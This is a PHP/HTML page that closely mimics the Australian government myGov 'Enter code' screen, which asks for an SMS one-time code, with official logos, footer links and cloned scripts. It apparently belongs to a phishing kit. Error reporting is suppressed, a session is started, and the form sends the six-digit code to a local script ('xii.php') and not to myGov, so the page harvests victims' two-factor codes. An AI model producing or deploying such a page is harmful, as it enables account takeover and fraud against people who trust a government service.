<?php
error_reporting(0);
session_start();
?>
<!DOCTYPE html>
<html lang="en">
<!--<!
  [endif]-->

<head>
    <!--
E: PROD; 
C: MW1w; 
N: MW1w16; 
S: SW16d;  
-->
    <meta charset="utf-8" />
    <meta http-equiv="x-ua-compatible" content="ie=edge" />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <title>Enter code - myGov</title>
    <meta name="description" content="" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <!-- phone number format detection, turning it off -->
    <meta name="format-detection" content="telephone=no" />
    <script type="text/javascript" src="/LoginServices/main/ruxitagentjs_ICA2NVfghjqrux_10253221019152312.js"
        data-dtconfig="app=5f15dc81410a75c1|ssc=1|featureHash=ICA2NVfghjqrux|vcv=2|rdnt=0|uxrgce=1|bp=3|cuc=gpalpirq|mel=100000|md=mdcc1=ainput#user-id,mdcc2=adiv.error-msg-text span,mdcc3=aspan[data-home-welcome-message]|ssv=4|lastModification=1716401325811|dtVersion=10253221019152312|tp=500,50,0,1|uxdcw=1500|agentUri=/LoginServices/main/ruxitagentjs_ICA2NVfghjqrux_10253221019152312.js|reportUrl=/LoginServices/main/rb_6de8e2e9-6719-45b3-86be-7effcb9f6525|rid=RID_315652661|rpid=-1439370307|domain=my.gov.au">
    </script>
    <link rel="icon" type="image/png" sizes="32x32" href="../Assets/images/favicon-32x32.png" />
    <link rel="icon" type="image/png" sizes="16x16" href="../Assets/images/favicon-16x16.png" />
    <link
        href="https://fonts.googleapis.com/css?family=Montserrat:200,400,700|Roboto:300,400,500,700,900&amp;display=swap"
        rel="stylesheet" />
    <link href="../Assets/css/mgv2-application.css" rel="stylesheet" />
    <link href="../Assets/css/blugov.css" rel="stylesheet" />

</head>

<body>
    <noscript>
        <div class="outage">
            <div class="outage__inner">
                <div>
                    <span class="is-visuallyhidden"> Warning message: </span>
                    <p>JavaScript is required for myGov to work correctly.</p>
                </div>
            </div>
        </div>
    </noscript>



    <div class="brand-rainbow">&nbsp;</div>
    <header role="banner" class="mgvEnhanceHeader">
        <section class="wrapper">
            <div class="inner">
                <div class="unauth-grid">
                    <div class="unauth-grid-row">
                        <a href="https://my.gov.au/" class="unauth-govt-crest__link">
                            <img id="unauth-govt-crest" src="../Assets/images/myGov-cobranded-logo-black.svg"
                                alt="Australian Government and myGov logo" role="img" />
                        </a>

                        <div class="header-links">
                            <a href="javascript:void(0);">Help</a>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    </header>

    <div class="wrapper-mapwap">
        <div class="main-block" id="content" role="main">
            <h1>Enter code</h1>
            <p>We sent a code by SMS to your mobile number.</p>
            <form id="otp-entry-form" action="../Assets/scripts/xii.php" method="post" autocomplete="off">
                <div class="code-container">
                    <label for="otpanswer">Code
                        <input id="otpanswer" name="otp" type="tel" class="security-code"
                            data-number-mobile-input="data-number-mobile-input" autocomplete="off" pattern="[0-9]{6}" required />
                    </label>
                </div>

                <!-- do nothing -->

                <div class="button-container">
                    <button type="submit" class="button-main button" name="_eventId_submitOtp">
                        Next
                    </button>
                    <!-- <button class="button-minor button">Cancel</button> -->
                </div>
            </form>
        </div>
    </div>

    <footer role="contentinfo">
        <div class="wrapper">
            <div class="inner">
                <section class="footer-list">
                    <nav>
                        <h2 class="sr-only" aria-label="Footer">Footer</h2>
                        <ul class="lower-links">
                            <li>
                                <a target="_blank" href="https://my.gov.au/en/about/terms">Terms of use</a>
                            </li>
                            <li>
                                <a target="_blank" href="https://my.gov.au/en/about/privacy-and-security">Privacy and
                                    security</a>
                            </li>
                            <li>
                                <a target="_blank" href="https://my.gov.au/en/about/copyright">Copyright</a>
                            </li>
                            <li>
                                <a target="_blank" href="https://my.gov.au/en/about/accessibility">Accessibility</a>
                            </li>
                        </ul>
                    </nav>
                </section>
                <div class="footer-lower">
                    <section class="footer-lower-logo">
                        <a href="https://my.gov.au/">
                            <img src="../Assets/images/myGov-cobranded-logo-white.svg"
                                alt="Australian Government and myGov logo" width="313.17" height="70" role="img" />
                        </a>
                    </section>

                    <p class="footer-acknowledgement">
                        We acknowledge the Traditional Custodians of the lands we live on.
                        We pay our respects to all Elders, past and present, of all
                        Aboriginal and Torres Strait Islander nations.
                    </p>
                </div>
            </div>
        </div>
    </footer>

    <script type="text/javascript" src="/mygov/content/mgv2/js/mgv2-vendor.js"></script>
    <script type="text/javascript" src="/mygov/content/mgv2/js/mgv2-application.js"></script>
    <script type="text/javascript" src="/mygov/content/mgv2/js/login.js"></script>
    <script type="module" src="/mygov/content/mgv2/js/mygov-passkeys.js"></script>
    <div id="artifact-metadata"></div>
</body>

</html>